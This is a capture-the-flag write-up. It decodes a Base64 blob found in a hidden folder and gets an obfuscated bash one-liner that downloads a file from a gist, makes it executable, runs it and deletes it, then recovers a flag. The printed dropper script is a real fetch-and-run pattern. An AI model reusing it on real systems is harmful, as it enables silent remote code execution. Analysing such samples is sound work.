# Welcome to the Park

### Challenge Description
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/abf8542e-f3b4-42ef-9157-04f7165515b6)

### Solution
After we unzip the archive, we find some folders, I already have `ll` aliased to `ls -lah` in my bash so when I entered the `welcome` folder, I could immediately see a `.hidden` folder:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/93622001-1d48-460f-8a44-47fd293da6ed)

Within this folder there's what looks to be a binary file:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/70f8965b-aa00-4edb-bb35-1f94f8b829bf)

But simply reading it, we can see some Base64 blob:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/9a212914-856d-4d43-ad33-1ce54638b73a)

After decoding it, we see this bash script: 

```bash
A0b='tmp="$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='" -o "${tmp}"; i';juuQQ7l7='f [[ -s "${tmp}';juuQQ7l7X='" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 "${tmp}"; ';zRO3OUtcXt='"${tmp}"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' "${tmp}"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB}|/bin/zsh
```
I removed the pipe at the end so that I could see echoed output:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/294b0fcc-1376-49d4-a54a-ffdd959b42b1)

It's doing a curl on a gist, saving whatever file it redirects to locally, making it executable, runs it and then deletes it. The gist it is downloading is this file:  
![image](https://gist.githubusercontent.com/stuartjash/a7d187c44f4327739b752d037be45f01/raw/4ea401db574d5cceb0ba517feb9f84971136f067/JohnHammond.jpg)

Which is John Hammond character from Jurassic Park and also the character that we all know and love for his hacker talent and great CTF writer :)

We download the "jpg" file, run strings on it and get our flag:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/09c224fb-fdce-4630-9c67-a1f35198624d)

flag{680b736565c76941a364775f06383466}
